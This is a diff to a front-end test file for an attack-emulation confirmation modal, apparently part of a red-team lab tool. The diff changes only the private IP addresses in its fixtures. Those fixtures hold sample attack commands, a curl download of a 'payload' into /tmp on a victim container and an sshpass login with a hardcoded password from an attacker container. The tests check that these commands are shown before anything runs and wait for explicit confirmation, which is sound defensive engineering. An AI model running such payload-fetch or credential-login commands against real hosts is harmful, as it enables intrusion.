@@ -33,13 +33,13 @@ function makePreview(): EmulacaoPreview {
         tem_externo: false,
         comandos: [
           {
-            comando: "curl http://172.20.0.5/payload -o /tmp/p",
+            comando: "curl http://192.168.10.5/payload -o /tmp/p",
             local: false,
             tem_externo: false,
             alvos: ["victim-01"],
             destinos: [
               {
-                valor: "172.20.0.5",
+                valor: "192.168.10.5",
                 origem: "curl",
                 externo: false,
                 container: "victim-01",
@@ -48,13 +48,13 @@ function makePreview(): EmulacaoPreview {
             ],
           },
           {
-            comando: "sshpass -p pw ssh red@172.21.0.20 'whoami'",
+            comando: "sshpass -p pw ssh red@192.168.20.30 'whoami'",
             local: false,
             tem_externo: false,
             alvos: ["attacker-kali"],
             destinos: [
               {
-                valor: "172.21.0.20",
+                valor: "192.168.20.30",
                 origem: "ssh",
                 externo: false,
                 container: "attacker-kali",
@@ -100,9 +100,9 @@ describe("EmulationConfirmModal (Req. 6.5 — shows commands + targets before co
     })
 
     // The concrete commands render verbatim.
-    await screen.findByText("curl http://172.20.0.5/payload -o /tmp/p")
+    await screen.findByText("curl http://192.168.10.5/payload -o /tmp/p")
     expect(
-      screen.getByText("sshpass -p pw ssh red@172.21.0.20 'whoami'"),
+      screen.getByText("sshpass -p pw ssh red@192.168.20.30 'whoami'"),
     ).toBeInTheDocument()
 
     // The target containers of each command render.
@@ -125,7 +125,7 @@ describe("EmulationConfirmModal (Req. 6.5 — shows commands + targets before co
       <EmulationConfirmModal casoId="c0026" open onClose={vi.fn()} />,
     )
 
-    await screen.findByText("curl http://172.20.0.5/payload -o /tmp/p")
+    await screen.findByText("curl http://192.168.10.5/payload -o /tmp/p")
 
     // Still not executed until the explicit control is clicked.
     expect(runMock).not.toHaveBeenCalled()
@@ -150,7 +150,7 @@ describe("EmulationConfirmModal (Req. 6.5 — shows commands + targets before co
       <EmulationConfirmModal casoId="c0026" open onClose={onClose} />,
     )
 
-    await screen.findByText("curl http://172.20.0.5/payload -o /tmp/p")
+    await screen.findByText("curl http://192.168.10.5/payload -o /tmp/p")
 
     const cancel = screen.getByRole("button", { name: "Cancelar" })
     await user.click(cancel)
